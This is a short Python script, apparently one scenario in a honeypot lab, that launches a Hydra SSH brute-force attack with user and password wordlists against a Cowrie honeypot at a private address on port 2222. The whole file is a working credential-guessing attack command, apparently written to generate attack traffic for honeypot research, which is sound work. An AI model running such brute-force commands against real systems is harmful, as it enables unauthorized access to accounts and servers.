# Author: Lazaro Perez Jr.

# Scenario 1: Hydra SSH brute force on Cowrie
import subprocess
def run():
	command=["hydra","-L","/attacks/wordlists/users.txt","-P","/attacks/wordlists/passwords.txt","-s","2222","-t","4","172.30.0.20","ssh"]
	subprocess.run(command)
